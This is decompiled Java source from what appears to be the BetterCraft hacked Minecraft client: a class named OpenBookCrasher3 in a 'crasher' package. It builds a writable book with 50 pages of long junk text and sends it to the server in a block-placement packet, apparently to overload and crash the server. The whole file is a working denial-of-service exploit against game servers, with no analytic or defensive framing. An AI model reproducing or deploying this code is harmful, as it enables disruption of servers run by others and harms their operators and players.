/*    */ package me.nzxter.bettercraft.mods.crasher.obc;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
/*    */ import net.minecraft.util.math.BlockPos;
/*    */ 
/*    */ public class OpenBookCrasher3 {
/*    */   public static void start() {
/* 15 */     (new Thread()
/*    */       {
/*    */         public void run()
/*    */         {
/*    */           try {
/* 20 */             ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
/* 21 */             NBTTagList list = new NBTTagList();
/* 22 */             NBTTagCompound tag = new NBTTagCompound();
/* 23 */             Minecraft.getMinecraft(); String author = Minecraft.getSession().getUsername();
/* 24 */             String title = "Play with me.";
/* 25 */             String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
/* 26 */             for (int i2 = 0; i2 < 50; i2++) {
/* 27 */               String siteContent = size;
/* 28 */               NBTTagString tString = new NBTTagString(siteContent);
/* 29 */               list.appendTag((NBTBase)tString);
/*    */             } 
/* 31 */             tag.setString("author", author);
/* 32 */             tag.setString("title", title);
/* 33 */             tag.setTag("pages", (NBTBase)list);
/* 34 */             book.setTagInfo("pages", (NBTBase)list);
/* 35 */             book.setTagCompound(tag);
/* 36 */             (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).player.posX, (Minecraft.getMinecraft()).player.posY - 2.0D, (Minecraft.getMinecraft()).player.posZ), 1, book, 0.0F, 0.0F, 0.0F));
/*    */           }
/* 38 */           catch (Exception e2) {
/*    */             return;
/*    */           } 
/*    */         }
/* 42 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\obc\OpenBookCrasher3.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */